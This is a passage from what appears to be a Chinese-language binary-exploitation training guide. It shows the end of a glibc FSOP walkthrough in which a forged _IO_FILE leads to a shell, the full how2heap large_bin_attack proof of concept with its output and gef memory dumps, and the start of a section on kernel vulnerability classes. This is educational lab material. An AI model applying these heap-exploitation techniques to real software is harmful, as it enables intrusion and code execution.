\u4ece unsorted bin \u653e\u56de smallbins[5] \u4e2d\u3002\u800c\u5728 <code>_IO_FILE</code> \u7ed3\u6784\u4e2d\uff0c\u504f\u79fb 0x60 \u6307\u5411 <code>struct _IO_marker *_markers</code>\uff0c\u504f\u79fb 0x68 \u6307\u5411 <code>struct _IO_FILE *_chain</code>\uff0c\u8fd9\u4e24\u4e2a\u503c\u6b63\u597d\u662f old top \u7684\u8d77\u59cb\u5730\u5740\u3002\u8fd9\u6837 fp \u5c31\u6307\u5411\u4e86 old top\uff0c\u8fd9\u662f\u4e00\u4e2a\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u5730\u5740\u3002</p> <p>\u5728\u5c06 <code>_IO_OVERFLOW</code> \u4fee\u6539\u4e3a system \u7684\u65f6\u5019\uff0c\u6709\u4e00\u4e9b\u6761\u4ef6\u68c0\u67e5\uff1a</p> <pre><code>      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\n#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T\n       || (_IO_vtable_offset (fp) == 0\n           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\n                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\n#endif\n       )\n      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)     // \u9700\u8981\u4fee\u6539\u4e3a system \u51fd\u6570\n// libio/libio.h\n\n  struct _IO_wide_data *_wide_data;\n\n/* Extra data for wide character streams.  */\nstruct _IO_wide_data\n{\n  wchar_t *_IO_read_ptr;    /* Current read pointer */\n  wchar_t *_IO_read_end;    /* End of get area. */\n  wchar_t *_IO_read_base;    /* Start of putback+get area. */\n  wchar_t *_IO_write_base;    /* Start of put area. */\n  wchar_t *_IO_write_ptr;    /* Current put pointer. */\n  wchar_t *_IO_write_end;    /* End of put area. */\n  wchar_t *_IO_buf_base;    /* Start of reserve area. */\n  wchar_t *_IO_buf_end;        /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */\n  wchar_t *_IO_backup_base;    /* Pointer to first valid character of\n                   backup area */\n  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */\n\n  __mbstate_t _IO_state;\n  __mbstate_t _IO_last_state;\n  struct _IO_codecvt _codecvt;\n\n  wchar_t _shortbuf[1];\n\n  const struct _IO_jump_t *_wide_vtable;\n};\n</code></pre> <p>\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e <code>fp-&gt;_mode = 0</code>\uff0c<code>fp-&gt;_IO_write_base = (char *) 2</code> \u548c <code>fp-&gt;_IO_write_ptr = (char *) 3</code>\uff0c\u4ece\u800c\u7ed5\u8fc7\u68c0\u67e5\u3002</p> <p>\u7136\u540e\uff0c\u5c31\u662f\u4fee\u6539 <code>_IO_jump_t</code>\uff0c\u5c06\u5176\u6307\u5411 winner\uff1a</p> <pre><code>gef\u27a4  x/30gx p1-0x10+0x400\n0x602400:    0x0068732f6e69622f    0x0000000000000061  &lt;-- old top\n0x602410:    0x00007ffff7dd1b78    0x00007ffff7dd2510      &lt;-- bk points to io_list_all-0x10\n0x602420:    0x0000000000000002    0x0000000000000003      &lt;-- _IO_write_base, _IO_write_ptr\n0x602430:    0x0000000000000000    0x0000000000000000\n0x602440:    0x0000000000000000    0x0000000000000000\n0x602450:    0x0000000000000000    0x0000000000000000\n0x602460:    0x0000000000000000    0x0000000000000000\n0x602470:    0x0000000000000000    0x00000000004006d3      &lt;-- winner\n0x602480:    0x0000000000000000    0x0000000000000000\n0x602490:    0x0000000000000000    0x0000000000000000\n0x6024a0:    0x0000000000000000    0x0000000000000000\n0x6024b0:    0x0000000000000000    0x0000000000000000\n0x6024c0:    0x0000000000000000    0x0000000000000000\n0x6024d0:    0x0000000000000000    0x0000000000602460      &lt;-- vtable\n0x6024e0:    0x0000000000000000    0x0000000000000000\ngef\u27a4  p *((struct _IO_FILE_plus *) 0x602400)\n$1 = {\n  file = {\n    _flags = 0x6e69622f,\n    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;,\n    _IO_read_end = 0x7ffff7dd1b78 &lt;main_arena+88&gt; \"\\020@b\",\n    _IO_read_base = 0x7ffff7dd2510 \"\",\n    _IO_write_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;,\n    _IO_write_ptr = 0x3 &lt;error: Cannot access memory at address 0x3&gt;,\n    _IO_write_end = 0x0,\n    _IO_buf_base = 0x0,\n    _IO_buf_end = 0x0,\n    _IO_save_base = 0x0,\n    _IO_backup_base = 0x0,\n    _IO_save_end = 0x0,\n    _markers = 0x0,\n    _chain = 0x0,\n    _fileno = 0x0,\n    _flags2 = 0x0,\n    _old_offset = 0x4006d3,\n    _cur_column = 0x0,\n    _vtable_offset = 0x0,\n    _shortbuf = \"\",\n    _lock = 0x0,\n    _offset = 0x0,\n    _codecvt = 0x0,\n    _wide_data = 0x0,\n    _freeres_list = 0x0,\n    _freeres_buf = 0x0,\n    __pad5 = 0x0,\n    _mode = 0x0,\n    _unused2 = '\\000' &lt;repeats 19 times&gt;\n  },\n  vtable = 0x602460\n}\n</code></pre> <p>\u6700\u540e\u968f\u610f\u5206\u914d\u4e00\u4e2a chunk\uff0c\u7531\u4e8e <code>size&lt;= 2*SIZE_SZ</code>\uff0c\u6240\u4ee5\u4f1a\u89e6\u53d1 <code>_IO_flush_all_lockp</code> \u4e2d\u7684 <code>_IO_OVERFLOW</code> \u51fd\u6570\uff0c\u83b7\u5f97 shell\u3002</p> <pre><code>  for (;; )\n    {\n      int iters = 0;\n      while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))\n        {\n          bck = victim-&gt;bk;\n          if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)\n              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))\n            malloc_printerr (check_action, \"malloc(): memory corruption\",\n                             chunk2mem (victim), av);\n          size = chunksize (victim);\n</code></pre> <p>\u5230\u6b64\uff0chow2heap \u91cc\u5168\u90e8\u7684\u5806\u5229\u7528\u65b9\u6cd5\u5c31\u5168\u90e8\u8bb2\u5b8c\u4e86\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#319-linux","title":"3.1.9 Linux \u5806\u5229\u7528\uff08\u56db\uff09","text":"<ul> <li>how2heap</li> <li>large_bin_attack</li> <li>house_of_rabbit</li> <li>house_of_roman</li> <li>\u53c2\u8003\u8d44\u6599</li> </ul> <p>\u4e0b\u8f7d\u6587\u4ef6</p>"},{"location":"Training/Material/Binary%20Exploitation/#how2heap_3","title":"how2heap","text":""},{"location":"Training/Material/Binary%20Exploitation/#large_bin_attack","title":"large_bin_attack","text":"<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nint main() {\n    unsigned long stack_var1 = 0;\n    unsigned long stack_var2 = 0;\n\n    fprintf(stderr, \"The targets we want to rewrite on stack:\\n\");\n    fprintf(stderr, \"stack_var1 (%p): %ld\\n\", &amp;stack_var1, stack_var1);\n    fprintf(stderr, \"stack_var2 (%p): %ld\\n\\n\", &amp;stack_var2, stack_var2);\n\n    unsigned long *p1 = malloc(0x100);\n    fprintf(stderr, \"Now, we allocate the first chunk: %p\\n\", p1 - 2);\n    malloc(0x10);\n\n    unsigned long *p2 = malloc(0x400);\n    fprintf(stderr, \"Then, we allocate the second chunk(large chunk): %p\\n\", p2 - 2);\n    malloc(0x10);\n\n    unsigned long *p3 = malloc(0x400);\n    fprintf(stderr, \"Finally, we allocate the third chunk(large chunk): %p\\n\\n\", p3 - 2);\n    malloc(0x10);\n\n    // deal with tcache - libc-2.26\n    // int *a[10], *b[10], i;\n    // for (i = 0; i &lt; 7; i++) {\n    //     a[i] = malloc(0x100);\n    //     b[i] = malloc(0x400);\n    // }\n    // for (i = 0; i &lt; 7; i++) {\n    //     free(a[i]);\n    //     free(b[i]);\n    // }\n\n    free(p1);\n    free(p2);\n    fprintf(stderr, \"Now, We free the first and the second chunks now and they will be inserted in the unsorted bin\\n\");\n\n    malloc(0x30);\n    fprintf(stderr, \"Then, we allocate a chunk and the freed second chunk will be moved into large bin freelist\\n\\n\");\n\n    p2[-1] = 0x3f1;\n    p2[0] = 0;\n    p2[2] = 0;\n    p2[1] = (unsigned long)(&amp;stack_var1 - 2);\n    p2[3] = (unsigned long)(&amp;stack_var2 - 4);\n    fprintf(stderr, \"Now we use a vulnerability to overwrite the freed second chunk\\n\\n\");\n\n    free(p3);\n    malloc(0x30);\n    fprintf(stderr, \"Finally, we free the third chunk and malloc again, targets should have already been rewritten:\\n\");\n    fprintf(stderr, \"stack_var1 (%p): %p\\n\", &amp;stack_var1, (void *)stack_var1);\n    fprintf(stderr, \"stack_var2 (%p): %p\\n\", &amp;stack_var2, (void *)stack_var2);\n}\n$ gcc -g large_bin_attack.c\n$ ./a.out \nThe targets we want to rewrite on stack:\nstack_var1 (0x7fffffffdeb0): 0\nstack_var2 (0x7fffffffdeb8): 0\n\nNow, we allocate the first chunk: 0x555555757000\nThen, we allocate the second chunk(large chunk): 0x555555757130\nFinally, we allocate the third chunk(large chunk): 0x555555757560\n\nNow, We free the first and the second chunks now and they will be inserted in the unsorted bin\nThen, we allocate a chunk and the freed second chunk will be moved into large bin freelist\n\nNow we use a vulnerability to overwrite the freed second chunk\n\nFinally, we free the third chunk and malloc again, targets should have already been rewritten:\nstack_var1 (0x7fffffffdeb0): 0x555555757560\nstack_var2 (0x7fffffffdeb8): 0x555555757560\n</code></pre> <p>\u8be5\u6280\u672f\u53ef\u7528\u4e8e\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u503c\uff0c\u4f8b\u5982\u6808\u4e0a\u7684\u53d8\u91cf stack_var1 \u548c stack_var2\u3002\u5728\u5b9e\u8df5\u4e2d\u5e38\u5e38\u4f5c\u4e3a\u5176\u4ed6\u6f0f\u6d1e\u5229\u7528\u7684\u524d\u594f\uff0c\u4f8b\u5982\u5728 fastbin attack \u4e2d\u7528\u4e8e\u4fee\u6539\u5168\u5c40\u53d8\u91cf global_max_fast \u4e3a\u4e00\u4e2a\u5f88\u5927\u7684\u503c\u3002</p> <p>\u9996\u5148\u6211\u4eec\u5206\u914d chunk p1, p2 \u548c p3\uff0c\u5e76\u4e14\u5728\u5b83\u4eec\u4e4b\u95f4\u63d2\u5165\u5176\u4ed6\u7684 chunk \u4ee5\u9632\u6b62\u5728\u91ca\u653e\u65f6\u88ab\u5408\u5e76\u3002\u6b64\u65f6\u7684\u5185\u5b58\u5e03\u5c40\u5982\u4e0b\uff1a</p> <pre><code>gef\u27a4  x/2gx &amp;stack_var1 \n0x7fffffffde70:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/4gx p1-2\n0x555555757000:    0x0000000000000000    0x0000000000000111  &lt;-- p1\n0x555555757010:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/8gx p2-6\n0x555555757110:    0x0000000000000000    0x0000000000000021\n0x555555757120:    0x0000000000000000    0x0000000000000000\n0x555555757130:    0x0000000000000000    0x0000000000000411  &lt;-- p2\n0x555555757140:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/8gx p3-6\n0x555555757540:    0x0000000000000000    0x0000000000000021\n0x555555757550:    0x0000000000000000    0x0000000000000000\n0x555555757560:    0x0000000000000000    0x0000000000000411  &lt;-- p3\n0x555555757570:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/8gx p3+(0x410/8)-2\n0x555555757970:    0x0000000000000000    0x0000000000000021\n0x555555757980:    0x0000000000000000    0x0000000000000000\n0x555555757990:    0x0000000000000000    0x0000000000020671  &lt;-- top\n0x5555557579a0:    0x0000000000000000    0x0000000000000000\n</code></pre> <p>\u7136\u540e\u4f9d\u6b21\u91ca\u653e\u6389 p1 \u548c p2\uff0c\u8fd9\u4e24\u4e2a free chunk \u5c06\u88ab\u653e\u5165 unsorted bin\uff1a</p> <pre><code>gef\u27a4  x/8gx p1-2\n0x555555757000:    0x0000000000000000    0x0000000000000111  &lt;-- p1 [be freed]\n0x555555757010:    0x00007ffff7dd3b78    0x0000555555757130\n0x555555757020:    0x0000000000000000    0x0000000000000000\n0x555555757030:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/8gx p2-2\n0x555555757130:    0x0000000000000000    0x0000000000000411  &lt;-- p2 [be freed]\n0x555555757140:    0x0000555555757000    0x00007ffff7dd3b78\n0x555555757150:    0x0000000000000000    0x0000000000000000\n0x555555757160:    0x0000000000000000    0x0000000000000000\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena 'main_arena' ]\n[+] unsorted_bins[0]: fw=0x555555757130, bk=0x555555757000\n \u2192   Chunk(addr=0x555555757140, size=0x410, flags=PREV_INUSE)   \u2192   Chunk(addr=0x555555757010, size=0x110, flags=PREV_INUSE)\n[+] Found 2 chunks in unsorted bin.\n</code></pre> <p>\u63a5\u4e0b\u6765\u968f\u4fbf malloc \u4e00\u4e2a chunk\uff0c\u5219 p1 \u88ab\u5207\u5206\u4e3a\u4e24\u5757\uff0c\u4e00\u5757\u4f5c\u4e3a\u5206\u914d\u7684 chunk \u8fd4\u56de\uff0c\u5269\u4e0b\u7684\u4e00\u5757\u7ee7\u7eed\u7559\u5728 unsorted bin\uff08p1 \u7684\u4f5c\u7528\u5c31\u5728\u8fd9\u91cc\uff0c\u5982\u679c\u6ca1\u6709 p1\uff0c\u90a3\u4e48\u5207\u5206\u7684\u5c06\u662f p2\uff09\u3002\u800c p2 \u5219\u88ab\u6574\u7406\u56de\u5bf9\u5e94\u7684 large bin \u94fe\u8868\b\u4e2d\uff1a</p> <pre><code>gef\u27a4  x/14gx p1-2\n0x555555757000:    0x0000000000000000    0x0000000000000041  &lt;-- p1-1\n0x555555757010:    0x00007ffff7dd3c78    0x00007ffff7dd3c78\n0x555555757020:    0x0000000000000000    0x0000000000000000\n0x555555757030:    0x0000000000000000    0x0000000000000000\n0x555555757040:    0x0000000000000000    0x00000000000000d1  &lt;-- p1-2 [be freed]\n0x555555757050:    0x00007ffff7dd3b78    0x00007ffff7dd3b78      &lt;-- fd, bk\n0x555555757060:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/8gx p2-2\n0x555555757130:    0x0000000000000000    0x0000000000000411  &lt;-- p2 [be freed]\n0x555555757140:    0x00007ffff7dd3f68    0x00007ffff7dd3f68      &lt;-- fd, bk\n0x555555757150:    0x0000555555757130    0x0000555555757130      &lt;-- fd_nextsize, bk_nextsize\n0x555555757160:    0x0000000000000000    0x0000000000000000\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena 'main_arena' ]\n[+] unsorted_bins[0]: fw=0x555555757040, bk=0x555555757040\n \u2192   Chunk(addr=0x555555757050, size=0xd0, flags=PREV_INUSE)\n[+] Found 1 chunks in unsorted bin.\ngef\u27a4  heap bins large\n[ Large Bins for arena 'main_arena' ]\n[+] large_bins[63]: fw=0x555555757130, bk=0x555555757130\n \u2192   Chunk(addr=0x555555757140, size=0x410, flags=PREV_INUSE)\n[+] Found 1 chunks in 1 large non-empty bins.\n</code></pre> <p>\u6574\u7406\u7684\u8fc7\u7a0b\u5982\u4e0b\u6240\u793a\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f large bins \u4e2d chunk \u6309 fd \u6307\u9488\u7684\u987a\u5e8f\u4ece\u5927\u5230\u5c0f\u6392\u5217\uff0c\u5982\u679c\u5927\u5c0f\u76f8\u540c\u5219\u6309\u7167\u6700\u8fd1\u4f7f\u7528\u987a\u5e8f\u6392\u5217\uff1a</p> <pre><code>          /* place chunk in bin */\n\n          if (in_smallbin_range (size))\n            {\n                [ ... ]\n            }\n          else\n            {\n              victim_index = largebin_index (size);\n              bck = bin_at (av, victim_index);\n              fwd = bck-&gt;fd;\n\n              /* maintain large bins in sorted order */\n              if (fwd != bck)\n                {\n                  /* Or with inuse bit to speed comparisons */\n                  size |= PREV_INUSE;\n                  /* if smaller than smallest, bypass loop below */\n                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);\n                  if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size))\n                    {\n                        [ ... ]\n                    }\n                  else\n                    {\n                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);\n                      while ((unsigned long) size &lt; fwd-&gt;size)\n                        {\n                            [ ... ]\n                        }\n\n                      if ((unsigned long) size == (unsigned long) fwd-&gt;size)\n                        [ ... ]\n                      else\n                        {\n                          victim-&gt;fd_nextsize = fwd;\n                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;\n                          fwd-&gt;bk_nextsize = victim;\n                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;\n                        }\n                      bck = fwd-&gt;bk;\n                    }\n                }\n              else\n                [ ... ]\n            }\n\n          mark_bin (av, victim_index);\n          victim-&gt;bk = bck;\n          victim-&gt;fd = fwd;\n          fwd-&gt;bk = victim;\n          bck-&gt;fd = victim;\n</code></pre> <p>\u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u5bf9 large bin \u91cc\u7684 chunk p2 \u8fdb\u884c\u4fee\u6539\uff0c\u7ed3\u5408\u4e0a\u9762\u7684\u6574\u7406\u8fc7\u7a0b\uff0c\u6211\u4eec\u4f2a\u9020 p2 \u5982\u4e0b\uff1a</p> <pre><code>gef\u27a4  x/8gx p2-2\n0x555555757130:    0x0000000000000000    0x00000000000003f1  &lt;-- fake p2 [be freed]\n0x555555757140:    0x0000000000000000    0x00007fffffffde60      &lt;-- bk\n0x555555757150:    0x0000000000000000    0x00007fffffffde58      &lt;-- bk_nextsize\n0x555555757160:    0x0000000000000000    0x0000000000000000\n</code></pre> <p>\u540c\u6837\u7684\uff0c\u91ca\u653e p3\uff0c\u5c06\u5176\u653e\u5165 unsorted bin\uff0c\u7d27\u63a5\u7740\u8fdb\u884c malloc \u64cd\u4f5c\uff0c\u5c06 p3 \u6574\u7406\u56de large bin\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5224\u65ad\u6761\u4ef6 <code>(unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)</code> \u4e3a\u5047\uff0c\u7a0b\u5e8f\u5c06\u8fdb\u5165 else \u5206\u652f\uff0c\u5176\u4e2d <code>fwd</code> \u662f fake p2\uff0c<code>victim</code> \u662f p3\uff0c\u63a5\u7740 <code>bck</code> \u88ab\u8d4b\u503c\u4e3a (&amp;stack_var1 - 2)\u3002</p> <p>\u5728 p3 \u88ab\u653e\u56de large bin \u5e76\u6392\u5e8f\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u4f4d\u4e8e\u6808\u4e0a\u7684\u4e24\u4e2a\u53d8\u91cf\u4e5f\u88ab\u4fee\u6539\u6210\u4e86 <code>victim</code>\uff0c\u5bf9\u5e94\u7684\u8bed\u53e5\u5206\u522b\u662f <code>bck-&gt;fd = victim;</code> \u548c <code>ictim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code>\u3002</p> <pre><code>gef\u27a4  x/2gx &amp;stack_var1 \n0x7fffffffde70:    0x0000555555757560    0x0000555555757560\ngef\u27a4  x/8gx p2-2\n0x555555757130:    0x0000000000000000    0x00000000000003f1\n0x555555757140:    0x0000000000000000    0x0000555555757560\n0x555555757150:    0x0000000000000000    0x0000555555757560\n0x555555757160:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/8gx p3-2\n0x555555757560:    0x0000000000000000    0x0000000000000411\n0x555555757570:    0x0000555555757130    0x00007fffffffde60\n0x555555757580:    0x0000555555757130    0x00007fffffffde58\n0x555555757590:    0x0000000000000000    0x0000000000000000\n</code></pre> <p>\u8003\u8651 libc-2.26 \u4e0a\u7684\u60c5\u51b5\uff0c\u8fd8\u662f\u4e00\u6837\u7684\uff0c\u5904\u7406\u597d tchache \u5c31\u53ef\u4ee5\u4e86\uff0c\u5728 free \u4e4b\u524d\u628a\u4e24\u79cd\u5927\u5c0f\u7684 tcache bin \u90fd\u5360\u6ee1\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#3111-linux","title":"3.1.11 Linux \u5185\u6838\u6f0f\u6d1e\u5229\u7528","text":"<ul> <li>\u4ece\u7528\u6237\u6001\u5230\u5185\u6838\u6001</li> <li>\u5185\u6838\u6f0f\u6d1e\u5206\u7c7b</li> <li>\u5185\u6838\u5229\u7528\u65b9\u6cd5</li> <li>\u53c2\u8003\u8d44\u6599</li> </ul>"},{"location":"Training/Material/Binary%20Exploitation/#_25","title":"\u4ece\u7528\u6237\u6001\u5230\u5185\u6838\u6001","text":"\u4f01\u56fe \u7528\u6237\u6001\u6f0f\u6d1e\u5229\u7528 \u5185\u6838\u6001\u6f0f\u6d1e\u5229\u7528 \u86ee\u529b\u6cd5\u5229\u7528\u6f0f\u6d1e \u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u591a\u6b21\u5d29\u6e83\u5e76\u91cd\u542f\uff08\u6216\u81ea\u52a8\u91cd\u542f\uff09 \u8fd9\u5c06\u5bfc\u81f4\u673a\u5668\u9677\u5165\u4e0d\u4e00\u81f4\u7684\u72b6\u6001\uff0c\u901a\u5e38\u4f1a\u5bfc\u81f4\u6b7b\u673a\u6216\u91cd\u542f \u5f71\u54cd\u76ee\u6807\u7a0b\u5e8f \u653b\u51fb\u8005\u5bf9\u88ab\u653b\u51fb\u7a0b\u5e8f\uff08\u7279\u522b\u662f\u672c\u5730\u653b\u51fb\uff09\u62e5\u6709\u66f4\u591a\u7684\u63a7\u5236\uff08\u4f8b\u5982\u653b\u51fb\u8005\u53ef\u4ee5\u8bbe\u7f6e\u88ab\u653b\u51fb\u7a0b\u5e8f\u7684\u8fd0\u884c\u73af\u5883\uff09\u3002\u88ab\u653b\u51fb\u7a0b\u5e8f\u662f\u5b83\u7684\u5e93\u5b50\u7cfb\u7edf\u7684\u552f\u4e00\u4f7f\u7528\u8005\uff08\u4f8b\u5982\u5185\u5b58\u5206\u914d\u8868\uff09 \u653b\u51fb\u8005\u9700\u8981\u548c\u5176\u4ed6\u6240\u6709\u6b32\u201c\u5f71\u54cd\u201d\u5185\u6838\u7684\u5e94\u7528\u7a0b\u5e8f\u7ade\u4e89\u3002\u6240\u6709\u7684\u5e94\u7528\u7a0b\u5e8f\u90fd\u662f\u5185\u6838\u5b50\u7cfb\u7edf\u7684\u4f7f\u7528\u8005 \u6267\u884c shellcode shellcode \u53ef\u4ee5\u5229\u7528\u5df2\u7ecf\u901a\u8fc7\u5b89\u5168\u548c\u6b63\u786e\u6027\u4fdd\u8bc1\u7684\u7528\u6237\u6001\u95e8\u6765\u8fdb\u884c\u5185\u6838\u7cfb\u7edf\u8c03\u7528 shellcode \u5728\u66f4\u9ad8\u7684\u6743\u9650\u7ea7\u522b\u4e0a\u6267\u884c\uff0c\u5e76\u4e14\u5fc5\u987b\u5728\u4e0d\u60ca\u52a8\u7cfb\u7edf\u7684\u60c5\u51b5\u4e0b\u6b63\u786e\u5730\u8fd4\u56de\u5230\u5e94\u7528\u7a0b\u5e8f \u7ed5\u8fc7\u53cd\u6f0f\u6d1e\u5229\u7528\u4fdd\u62a4\u63aa\u65bd \u8fd9\u8981\u6c42\u8d8a\u6765\u8d8a\u590d\u6742\u7684\u65b9\u6cd5 \u5927\u90e8\u5206\u4fdd\u62a4\u63aa\u65bd\u5728\u5185\u6838\u6001\uff0c\u4f46\u5e76\u4e0d\u80fd\u4fdd\u62a4\u5185\u6838\u672c\u8eab\u3002\u653b\u51fb\u8005\u751a\u81f3\u80fd\u7981\u7528\u5927\u90e8\u5206\u4fdd\u62a4\u63aa\u65bd"},{"location":"Training/Material/Binary%20Exploitation/#_26","title":"\u5185\u6838\u6f0f\u6d1e\u5206\u7c7b","text":""},{"location":"Training/Material/Binary%20Exploitation/#_27","title":"\u672a\u521d\u59cb\u5316\u7684\u3001\u672a\u9a8c\u8bc1\u7684\u3001\u5df2\u635f\u574f\u7684\u6307\u9488\u89e3\u5f15\u7528","text":"<p>\u8fd9\u7c7b\u6f0f\u6d1e\u6db5\u76d6\u4e86\u6240\u6709\u4f7f\u7528\u6307\u9488\u7684\u60c5\u51b5\uff0c\u6240\u6307\u5185\u5bb9\u906d\u5230\u7834\u574f\u3001\u6ca1\u6709\u88ab\u6b63\u786e\u8bbe\u7f6e\u3001\u6216\u8005\u662f\u6ca1\u6709\u505a\u8db3\u591f\u7684\u9a8c\u8bc1\u3002</p> <p>\u6211\u4eec\u77e5\u9053\u4e00\u4e2a\u9759\u6001\u58f0\u660e\u7684\u6307\u9488\u88ab\u521d\u59cb\u5316\u4e3a NULL\uff0c\u4f46\u5176\u4ed6\u60c5\u51b5\u4e0b\u8fd9\u4e9b\u6307\u9488\u88ab\u660e\u786e\u5730\u8d4b\u503c\u4e4b\u524d\uff0c\u90fd\u662f\u672a\u521d\u59cb\u5316\u7684\uff0c\u5b83\u7684\u503c\u662f\u5b58\u653e\u6307\u9488\u5904\u7684\u5185\u5b58\u91cc\u7684\u4efb\u610f\u5185\u5bb9\u3002\u4f8b\u5982\u4e0b\u9762\u8fd9\u6837\uff0c\u6307\u9488\u88ab\u5b58\u653e\u5728\u6808\u4e0a\uff0c\u800c\u5b83\u7684\u5185\u5bb9\u662f\u4e4b\u524d\u51fd\u6570\u7559\u5728\u6808\u4e0a\u7684 \"A\" \u5b57\u7b26\u4e32\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid big_stack_usage() {\n    char big[0x100];\n    memset(big, 'A', 0x100);\n    printf(\"Big stack: %p ~ %p\\n\", big, big+0x100);\n}\n\nvoid ptr_un_initialized() {\n    char *p;\n    printf(\"Pointer value: %p =&gt; %p\\n\", &amp;p, p);\n}\n\nint main() {\n    big_stack_usage();\n    ptr_un_initialized();\n}\n$ gcc -fno-stack-protector pointer.c\n$ ./a.out\nBig stack: 0x7fffd6b0e400 ~ 0x7fffd6b0e500\nPointer value: 0x7fffd6b0e4f8 =&gt; 0x4141414141414141\n</code></pre> <p>\u4e0b\u9762\u770b\u4e00\u4e2a\u771f\u5b9e\u7684\u4f8b\u5b50\uff0c\u6765\u81ea FreeBSD8.0\uff1a</p> <pre><code>struct ucred ucred, *ucp;               // [1]\n[...]\n    refcount_init(&amp;ucred.cr_ref, 1);\n    ucred.cr_uid = ip-&gt;i_uid;\n    ucred.cr_ngroups = 1;\n    ucred.cr_groups[0] = dp-&gt;i_gid;     // [2]\n    ucp = &amp;ucred;\n</code></pre> <p>[1] \u5904\u7684 <code>ucred</code> \u5728\u6808\u4e0a\u8fdb\u884c\u4e86\u58f0\u660e\uff0c\u7136\u540e <code>cr_groups[0]</code> \u88ab\u8d4b\u503c\u4e3a <code>dp-&gt;i_gid</code>\u3002\u9057\u61be\u7684\u662f\uff0c<code>struct ucred</code> \u7ed3\u6784\u4f53\u7684\u5b9a\u4e49\u662f\u8fd9\u6837\u7684\uff1a</p> <pre><code>struct ucred {\n    u_int   cr_ref;     /* reference count */\n[...]\n    gid_t   *cr_groups; /* groups */\n    int     cr_agroups; /* Available groups */\n};\n</code></pre> <p>\u6211\u4eec\u770b\u5230 <code>cr_groups</code> \u662f\u4e00\u4e2a\u6307\u9488\uff0c\u800c\u4e14\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u5c31\u76f4\u63a5\u4f7f\u7528\u3002\u8fd9\u4e5f\u5c31\u610f\u5473\u7740\uff0c<code>dp-&gt;i_gid</code> \u7684\u503c\u5728 <code>ucred</code> \u88ab\u5206\u914d\u65f6\u88ab\u5199\u5165\u5230\u6808\u4e0a\u7684\u4efb\u610f\u5730\u5740\u3002</p> <p>\u7ee7\u7eed\u770b\u672a\u7ecf\u9a8c\u8bc1\u7684\u6307\u9488\uff0c\u8fd9\u5f80\u5f80\u53d1\u751f\u5728\u591a\u7528\u6237\u7684\u5185\u6838\u5730\u5740\u7a7a\u95f4\u4e2d\u3002\u6211\u4eec\u77e5\u9053\u5185\u6838\u7a7a\u95f4\u4f4d\u4e8e\u7528\u6237\u7a7a\u95f4\u7684\u4e0a\u9762\uff0c\u5b83\u7684\u9875\u8868\u5728\u6240\u6709\u8fdb\u7a0b\u7684\u9875\u8868\u4e2d\u90fd\u6709\u5907\u4efd\u3002\u6709\u4e9b\u865a\u62df\u5730\u5740\u88ab\u9009\u505a\u9650\u5236\u5730\u5740\uff0c\u9650\u5b9a\u5730\u5740\u4ee5\u4e0a\u6216\u4ee5\u4e0b\u7684\u865a\u62df\u5730\u5740\u5f52\u5185\u6838\u4f7f\u7528\uff0c\u800c\u5176\u4ed6\u7684\u5f52\u7528\u6237\u7a7a\u95f4\u4f7f\u7528\u3002\u5185\u6838\u51fd\u6570\u4e5f\u5c31\u662f\u4f7f\u7528\u8fd9\u4e2a\u9650\u5b9a\u5730\u5740\u6765\u5224\u65ad\u4e00\u4e2a\u6307\u9488\u6307\u5411\u7684\u662f\u5185\u6838\u8fd8\u662f\u7528\u6237\u7a7a\u95f4\u3002\u5982\u679c\u662f\u524d\u8005\uff0c\u5219\u53ef\u80fd\u53ea\u9700\u505a\u5c11\u91cf\u7684\u9a8c\u8bc1\uff0c\u4f46\u5982\u679c\u662f\u540e\u8005\uff0c\u5219\u8981\u683c\u5916\u5c0f\u5fc3\uff0c\u5426\u5219\u4e00\u4e2a\u7528\u6237\u7a7a\u95f4\u7684\u5730\u5740\u53ef\u80fd\u5728\u4e0d\u53d7\u63a7\u5236\u7684\u60c5\u51b5\u4e0b\u88ab\u89e3\u5f15\u7528\